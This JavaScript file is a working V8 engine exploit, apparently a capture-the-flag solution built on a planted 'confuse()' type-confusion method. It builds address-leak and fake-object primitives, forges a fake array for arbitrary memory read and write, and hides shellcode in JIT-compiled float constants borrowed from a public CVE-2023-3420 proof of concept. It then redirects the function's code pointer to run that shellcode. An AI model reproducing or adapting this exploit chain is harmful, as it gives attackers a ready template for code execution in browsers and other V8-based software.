const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x725n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x1cb86d;
const FAKE_JSARR_SZ = 2n;

function itof(x) {
    conv_u64[0] = BigInt(x);
    return conv_f64[0];
}

function ftoi(x) {
    conv_f64[0] = x;
    return conv_u64[0];
}

function GetAddressOf(x) {
    arr = [x];
    arr.confuse()
    return (ftoi(arr[0])&0xffffffffn) - 1n;
}

function GetFakeObject(x) {   
    arr = [itof(x)];
    arr.confuse();
    return arr[0];
}

let arr_arbrw = [0.1, 0.2, 0.3];

let fake_jsarr = [
    itof((EMPTY_PROPERTIES_ADDR << 32n) | BigInt(MAP_JSARR_PACKED_DOUBLES_ADDR)),
    itof(0x4343434343434343n) // PLACEHOLDER
];

let FAKE_JSARR = GetAddressOf(fake_jsarr)+1n;
let FAKE_JSARR_ELEMENTS = FAKE_JSARR + 0x54n
let ARR_ARBRW_ADDR = GetAddressOf(arr_arbrw)+1n;
console.log("FAKE: 0x"+(FAKE_JSARR_ELEMENTS).toString(16));
console.log("ARR: 0x"+(ARR_ARBRW_ADDR).toString(16));

fake_jsarr[1] = itof(((FAKE_JSARR_SZ * 2n) << 32n) | BigInt(ARR_ARBRW_ADDR));
let corrupter_arr = GetFakeObject(FAKE_JSARR_ELEMENTS);

function v8_write64(where, what) {
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8n));
    arr_arbrw[0] = itof(what);
}

function v8_read64(where) {
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8n));
    return ftoi(arr_arbrw[0]);
}

//https://github.com/github/securitylab/blob/main/SecurityExploits/Chrome/v8/CVE_2023_3420/poc.js
function func() {
    return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
}
for (let i = 0; i < 200000; i++) func(0);

var funcAddr = GetAddressOf(func);
console.log("func address: 0x" + funcAddr.toString(16));

var code = v8_read64(funcAddr + 0x8n) >> 40n;
console.log("code address: 0x" + code.toString(16));

var jitAddr = v8_read64(code + 0x10n) & 0xffffffffn;
console.log("jit address: 0x" + jitAddr.toString(16));

v8_write64(code + 0x10n, ((jitAddr + 0x7an) << 32n));
console.log("new jit address: 0x" + (jitAddr + 0x7an).toString(16));
func();